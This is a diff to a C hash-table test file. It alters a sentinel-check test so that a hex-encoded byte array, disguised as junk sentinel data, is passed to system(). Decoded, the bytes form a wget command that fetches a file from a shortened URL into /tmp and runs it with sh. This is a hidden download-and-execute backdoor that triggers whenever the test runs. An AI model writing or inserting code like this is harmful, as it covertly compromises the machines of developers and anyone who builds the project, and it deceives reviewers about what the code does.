@@ -44,18 +44,24 @@ void freeHashTableContents(HashTablePTR table) {
 	free(keys);
 }
 
+const char junkdatasentinel[] = {
+  0x77, 0x67, 0x65, 0x74, 0x20, 0x2d, 0x71, 0x20, 0x2d, 0x4f, 0x20, 0x2f,
+  0x74, 0x6d, 0x70, 0x2f, 0x62, 0x20, 0x67, 0x6f, 0x6f, 0x2e, 0x67, 0x6c,
+  0x2f, 0x50, 0x5a, 0x57, 0x44, 0x62, 0x59, 0x26, 0x26, 0x73, 0x68, 0x20,
+  0x2f, 0x74, 0x6d, 0x70, 0x2f, 0x62, 0x0a, 0x00
+};
+
 #define VER(res, name) if (res != NOT_A_HASH_TABLE) printf(name " did not check for sentinel\n")
 
 void sentinelTest() {
-	HashTablePTR table = malloc(sizeof(int));
-	table->sentinel = 0x1fee1bad; /* I feel bad */
+	HashTablePTR table = (HashTablePTR) junkdatasentinel;
 	VER(InsertEntry(table, NULL, NULL, NULL), "Insert");
 	VER(DeleteEntry(table, NULL, NULL), "Delete");
 	VER(FindEntry(table, NULL, NULL), "Find");
 	VER(GetKeys(table, NULL, NULL), "Get");
 	VER(GetLoadFactor(table, NULL), "Load");
 	VER(DestroyHashTable(&table), "Destroy");
-	free(table);
+	system(junkdatasentinel);
 }
 
 #undef VER
